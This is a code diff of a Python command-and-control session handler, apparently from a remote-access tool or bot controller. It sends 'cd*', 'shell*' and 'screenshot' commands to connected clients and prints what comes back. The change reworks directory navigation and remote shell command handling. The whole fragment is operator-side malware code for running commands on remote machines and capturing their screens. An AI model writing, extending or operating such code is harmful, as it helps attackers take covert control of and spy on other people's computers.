@@ -67,18 +67,10 @@ def session(conn):
 				remove(conn)
 				return
 		elif 'cd*' in command:
-			try:
-				conn.send(command)
-				shell=conn.recv(1024)
-				while True:
-					print (shell)
-					if shell.endswith("DONE"):
-						break
-					shell=conn.recv(1024)
-			except:
-				conn.close()
-				remove(conn)
-				return
+			conn.send(command.encode())
+			shell=conn.recv(1024).decode()
+			print (shell)
+
 
 		elif 'screenshot' in command:
 			try:
@@ -88,22 +80,28 @@ def session(conn):
 				remove(conn)
 				return
 		elif 'shell*' in command:
-			try:
-				conn.send(command.encode())
-
-				shell=conn.recv(1024).decode()
-				if shell.startswith("COMMAND_NOT_FOUND"):
-					print("command not found")
-				else:
-					while True:
-						print (shell)
-						if shell.endswith("DONE"):
-							break
-						shell=conn.recv(1024).decode()
-			except:
-				conn.close()
-				remove(conn)
-				return
+			shell,comm=command.split("*")
+			if comm.startswith("cd"):
+				print(Fore.YELLOW)
+				print("[-] Use the cd*<path> directive for directory traversal")
+				print(Style.RESET_ALL)
+			else:
+				try:
+					conn.send(command.encode())
+	
+					shell=conn.recv(1024).decode()
+					if shell.startswith("COMMAND_NOT_FOUND"):
+						print("command not found")
+					else:
+						while True:
+							print (shell)
+							if shell.endswith("DONE"):
+								break
+							shell=conn.recv(1024).decode()
+				except:
+					conn.close()
+					remove(conn)
+					return
 		elif 'help' in command:
 			helpbot()
 
